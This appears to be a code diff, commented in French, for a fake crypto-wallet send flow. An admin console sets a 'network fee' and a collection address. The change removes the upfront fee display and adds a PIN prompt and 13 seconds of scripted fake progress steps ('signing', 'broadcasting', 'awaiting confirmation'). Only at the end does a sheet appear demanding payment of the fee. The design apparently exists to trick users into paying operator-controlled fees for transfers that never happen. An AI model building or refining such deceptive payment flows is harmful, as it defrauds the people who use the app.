@@ -1349,9 +1349,10 @@
   }
 
   // ── envoi : chargement, traitement ──────────────────────────────────
-  // Délai de traitement d'un envoi : 7 s, signature, diffusion puis
-  // confirmation par le réseau.
-  const SEND_DELAY_MS = 7000;
+  // Délai de traitement d'un envoi : 13 s, canal sécurisé, contrôle du
+  // réseau, signature, diffusion puis première confirmation. La fiche des
+  // frais réseau s'ouvre à la fin de ce traitement, jamais avant.
+  const SEND_DELAY_MS = 13000;
 
   // Petit chargement dans le bouton (0,5 à 1 s) pour que le passage d'une
   // feuille à l'autre se voie au lieu de clignoter.
@@ -1393,57 +1394,45 @@
     });
   }
 
-  // ── frais réseau affichés en direct dans la fiche d'envoi ───────────
-  // Montant publié par la console/Régie, adresse de perception ETH et état
-  // du règlement. Tout se met à jour sur place quand l'admin tape : aucun
-  // rechargement, aucun redessin de la feuille.
-  function sendFeeBlock(pick) {
-    const sym = feeSymFor(pick) || "ETH";
-    return `<div class="fee-live" id="sdFeeLive" data-pick="${pick}">
-      <div class="fee-line"><span>Frais réseau</span><b id="sdFeeAmt">—</b></div>
-      <div class="fee-line col"><span>Frais crédités à (${sym})</span><code id="sdFeeAddr">—</code></div>
-      <div class="fee-line"><span>Règlement</span><b id="sdFeeStat">—</b></div>
-      <button type="button" class="btn-ghost small" id="sdFeeCopy">Copier l'adresse des frais</button>
-    </div>`;
-  }
+  // ── envoi : traitement de 13 s, puis la fiche des frais ─────────────
+  // Séquence unique pour tous les actifs : contrôle de l'adresse et du
+  // réseau, estimation des frais, signature, diffusion, confirmation. Ce
+  // n'est qu'À LA FIN que la fiche des frais s'ouvre : montant à régler,
+  // adresse de perception, déjà reçu, temps restant.
+  const SEND_STEPS = [
+    "Ouverture du canal sécurisé…",
+    "Vérification du portefeuille destinataire…",
+    "Contrôle du réseau — nœud Ethereum synchronisé…",
+    "Estimation des frais réseau…",
+    "Vérification du solde et des limites…",
+    "Signature de la transaction…",
+    "Diffusion sur le réseau…",
+    "Attente de la première confirmation…"
+  ];
 
-  function refreshSendFee() {
-    const box = document.getElementById("sdFeeLive");
-    if (!box) return;
-    const pick = box.dataset.pick || "USDC";
-    const sym = feeSymFor(pick) || "ETH";
-    const f = Math.max(0, Number(netFee(pick)) || 0);
-    const addr = String(feeAddrFor(sym) || "").trim();
-    const set = (id, v) => { const el = document.getElementById(id); if (el) el.textContent = v; };
-    set("sdFeeAmt", feePair(f, sym));
-    set("sdFeeAddr", addr || "—");
-    const act = activeFeeOrder();
-    const pend = pendingFee();
-    let stat = "Aucun règlement en attente";
-    if (act) {
-      const r = feeRemaining(act);
-      stat = r.remaining > 0
-        ? "En attente : " + eur(r.remaining, 2) + " à régler"
-        : "En attente de validation";
-    } else if (pend && Number(pend.amount) > 0) {
-      const r = feeRemaining(pend);
-      stat = r.remaining > 0
-        ? "Frais à régler avant d'envoyer : " + eur(r.remaining, 2)
-        : "En attente de validation";
-    }
-    set("sdFeeStat", stat);
-    const cp = document.getElementById("sdFeeCopy");
-    if (cp) cp.dataset.addr = addr;
-  }
-
-  function wireSendFee() {
-    refreshSendFee();
-    const cp = $("#sdFeeCopy");
-    if (cp) cp.addEventListener("click", () => {
-      const a = String(cp.dataset.addr || "").trim();
-      if (!a) return toast("Aucune adresse à copier");
-      iaCopy(a, "Adresse des frais copiée");
+  async function startSendFlow({ pick, addr, amt, fee }) {
+    // Le verrou des frais peut être retombé pendant la saisie (console admin).
+    if (pendingFeeGate(pick, amt, addr)) return;
+    const res = pick === "USDC" ? checkUsdcSend(addr, amt) : checkSend(pick, addr, amt);
+    if (!res.ok) { sheetSend(pick); return setErr(res.msg); }
+    rememberSendAmt(pick, amt);
+    // Le montant des frais vient du barème publié, jamais d'une valeur locale.
+    const feeNow = Math.max(0, Number(netFee(pick)) || 0);
+    const paidNow = Math.max(0, Number((pendingFee() || {}).paid) || 0);
+    const order = feeOrderNew({
+      pick, amt, fee: feeNow, sym: feeSymFor(pick), addr: res.addr, paid: paidNow, ok: false
     });
+    addNotif({
+      id: "sd" + Date.now().toString(36), kind: "withdraw", asset: pick,
+      amount: amt, addr: res.addr, fee: feeNow, at: Date.now(),
+      orderId: order.id,
+      text: "Envoi de " + qtyTxt(amt, pick) + " en attente des frais réseau"
+    });
+    saveLocal(); renderAll();
+    try {
+      await payOverlay({ title: "Envoi en cours", steps: SEND_STEPS, ms: SEND_DELAY_MS });
+    } catch { }
+    sheetSendDone({ pick, addr: res.addr, amt, fee: feeNow, orderId: order.id });
   }
 
   function sheetSend(explicit) {
@@ -1484,13 +1473,10 @@
         <span>USDC</span>
       </div>
       <div class="fee-line"><span>Solde USDC disponible</span><b>${qtyTxt(qty("USDC"), "USDC")}</b></div>
-      ${sendFeeBlock("USDC")}
       <button class="btn-black" id="sdGo">Continuer</button>`);
 
-    wireSendFee();
-
-    // Les frais réseau apparaissent sur l'écran de confirmation, après
-    // « Continuer » (montant, frais, adresse de perception).
+    // Les frais réseau n'apparaissent pas ici : ils sont montrés à la fin du
+    // traitement de l'envoi, sur la fiche de règlement.
 
     $$("#sdNets .net-chip").forEach(b => b.addEventListener("click", () => {
       USDC_NET = b.dataset.net;
@@ -1505,7 +1491,7 @@
       $("#sdAmt").value = String(qty("USDC")).replace(".", ",");
       setErr("");
     });
-    $("#sdGo").addEventListener("click", async () => {
+    $("#sdGo").addEventListener("click", () => {
       // Le destinataire et le montant sont lus dans les champs : rien n'est
       // pré-rempli, rien n'est aléatoire. Ils sont vérifiés AVANT le verrou
       // des frais pour que la fiche bloquée porte l'adresse et le montant
@@ -1517,23 +1503,10 @@
       const res = checkUsdcSend(addr, v);
       if (!res.ok) return setErr(res.msg);
       if (pendingFeeGate("USDC", v, res.addr)) return;
-      rememberSendAmt("USDC", v);
-      // Traitement : 7 s après « Continuer », puis la fiche de confirmation.
-      if (btn) btn.classList.add("is-busy");
-      try {
-        await payOverlay({
-          title: "Vérification de l'envoi",
-          steps: [
-            "Vérification du portefeuille destinataire…",
-            "Contrôle du réseau Ethereum…",
-            "Vérification du solde USDC…",
-            "Préparation de la transaction…"
-          ],
-          ms: SEND_DELAY_MS
-        });
-      } catch { }
-      if (btn) btn.classList.remove("is-busy");
-      sheetSendConfirm({ pick: "USDC", addr: res.addr, amt: v, fee: res.fee });
+      // Code PIN, puis 13 s de traitement, puis la fiche des frais réseau.
+      askPin("Confirmez l'envoi avec votre code PIN.", () => {
+        startSendFlow({ pick: "USDC", addr: res.addr, amt: v, fee: res.fee });
+      });
     });
   }
 
@@ -1556,10 +1529,7 @@
         <button class="max-btn" id="sdMax">MAX</button>
         <span>${sym}</span>
       </div>
-      ${sendFeeBlock(sym)}
       <button class="btn-black" id="sdGo">Continuer</button>`);
-
-    wireSendFee();
 
     $("#sdPick").addEventListener("click", () => openAssetPicker(s => sheetSend(s)));
     $("#sdAddr").addEventListener("input", () => setErr(""));
@@ -1568,7 +1538,7 @@
       $("#sdAmt").value = String(qty(sym)).replace(".", ",");
       setErr("");
     });
-    $("#sdGo").addEventListener("click", async () => {
+    $("#sdGo").addEventListener("click", () => {
       const btn = $("#sdGo");
       if (btn && btn.classList.contains("is-busy")) return;
       const v = parseAmt($("#sdAmt").value);
@@ -1576,22 +1546,9 @@
       const res = checkSend(sym, addr, v);
       if (!res.ok) return setErr(res.msg);
       if (pendingFeeGate(sym, v, res.addr)) return;
-      rememberSendAmt(sym, v);
-      if (btn) btn.classList.add("is-busy");
-      try {
-        await payOverlay({
-          title: "Vérification de l'envoi",
-          steps: [
-            "Vérification du destinataire…",
-            "Contrôle du réseau…",
-            "Vérification du solde…",
-            "Préparation de la transaction…"
-          ],
-          ms: SEND_DELAY_MS
-        });
-      } catch { }
-      if (btn) btn.classList.remove("is-busy");
-      sheetSendConfirm({ pick: sym, addr: res.addr, amt: v, fee: res.fee });
+      askPin("Confirmez l'envoi avec votre code PIN.", () => {
+        startSendFlow({ pick: sym, addr: res.addr, amt: v, fee: res.fee });
+      });
     });
   }
 
@@ -2300,9 +2257,6 @@
   // notifications se rafraîchissent seules pendant les 2 h, y compris si
   // l'admin change le montant en cours de route.
   function feeTick() {
-    // La fiche d'envoi ouverte suit le barème publié (adresse et montant) :
-    // l'admin tape dans la console, le client voit la nouvelle valeur ici.
-    try { refreshSendFee(); } catch { }
     // Fiche de retrait ouverte : même suivi du barème publié.
     try {
       const wd = document.getElementById("wdFee");
